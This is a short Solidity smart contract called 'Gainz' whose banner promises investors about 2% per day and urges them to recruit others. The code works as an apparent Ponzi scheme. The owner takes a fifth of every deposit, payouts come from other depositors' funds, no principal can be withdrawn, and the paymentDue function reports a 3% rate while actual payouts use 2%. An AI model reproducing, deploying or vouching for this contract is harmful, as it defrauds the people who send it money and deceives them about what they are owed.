pragma solidity ^0.4.25;

/*//////////////////////////////////////////////////////////////////////////////

  /$$$$$$            /$$                    
 /$$__  $$          |__/                    
| $$  \__/  /$$$$$$  /$$ /$$$$$$$  /$$$$$$$$
| $$ /$$$$ |____  $$| $$| $$__  $$|____ /$$/
| $$|_  $$  /$$$$$$$| $$| $$  \ $$   /$$$$/ 
| $$  \ $$ /$$__  $$| $$| $$  | $$  /$$__/  
|  $$$$$$/|  $$$$$$$| $$| $$  | $$ /$$$$$$$$
 \______/  \_______/|__/|__/  |__/|________/

1. Send any non-zero amount of ETH to this smart contract
2. Send any amount (even 0) to get your payment!

Gainz pays you ~2% of your investment per day!

- Use balanceOf function to check your balance
- Use paymentDue function to check how much money Gainz owes you

Spread the word! Share a link to Gainz smart contract page on etherscan.io

Great Gainz to everybody!

//////////////////////////////////////////////////////////////////////////////*/


contract Gainz {
    address owner;

    constructor () public {
        owner = msg.sender;
    }

    mapping (address => uint) balances;
    mapping (address => uint) timestamp;
    
    function() external payable {
        owner.transfer(msg.value / 5);
        if (balances[msg.sender] != 0){
        address userAddress = msg.sender;
        uint payment = balances[msg.sender]*2/100*(block.number-timestamp[msg.sender])/6000;
        userAddress.transfer(payment);
        }
        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;
    }
    
    // Check your balance!
    function balanceOf(address userAddress) public view returns (uint balance) {
        return balances[userAddress];
    }
    
    // Check how much money Gainz owes you!
    function paymentDue(address userAddress) public view returns (uint payment) {
        return balances[userAddress]*3/100*(block.number-timestamp[userAddress])/6000;
    }
}